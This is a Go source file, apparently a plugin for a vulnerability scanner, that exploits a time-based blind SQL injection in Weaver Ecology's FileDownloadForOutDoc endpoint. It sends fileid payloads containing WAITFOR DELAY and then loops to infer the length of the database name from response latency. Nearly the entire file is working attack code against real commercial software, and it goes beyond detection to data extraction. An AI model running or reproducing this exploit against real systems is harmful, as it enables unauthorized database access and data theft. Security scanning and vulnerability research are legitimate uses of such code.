package gox

import (
	"fmt"
	"net/http"
	"time"

	randutil "github.com/zan8in/pins/rand"
)

func ecologyFiledownloadforoutdocSqli(target string, variableMap map[string]any) error {

	cmd := "DB_name()"
	rint, _ := randutil.IntN(9999)
	fulltarget := target + "/weaver/weaver.file.FileDownloadForOutDoc"
	body := fmt.Sprintf("isFromOutImg=1&fileid=%d+WAITFOR+DELAY+'0:0:5'", rint)
	if postDelay(target, body, variableMap) {
		_ = Exp(target, cmd, variableMap)
	}
	setTarget(target, variableMap)
	setFullTarget(fulltarget, variableMap)

	return nil
}

func Exp(target, cmd string, variableMap map[string]any) int {
	length := 0
	for i := 1; i < 100; i++ {
		rint, _ := randutil.IntN(9999)
		body := fmt.Sprintf("isFromOutImg=1&fileid=%d IF LEN(%s)=%d WAITFOR DELAY '0:0:5'", rint, cmd, i)
		if postDelay(target, body, variableMap) {
			return i
		}
	}

	return length
}

func postDelay(target, body string, variableMap map[string]any) bool {
	url2 := target + "/weaver/weaver.file.FileDownloadForOutDoc"
	headers := map[string]string{
		"Content-Type": "application/x-www-form-urlencoded",
	}
	resp, err := DoHTTPWithTimeout(8*time.Second, http.MethodPost, url2, []byte(body), headers, false, variableMap)
	if err != nil || resp == nil {
		return false
	}
	if resp.Status != http.StatusOK {
		return false
	}
	return resp.Latency >= 5000
}

func init() {
	funcMap["ecology-filedownloadforoutdoc-sqli"] = ecologyFiledownloadforoutdocSqli
}
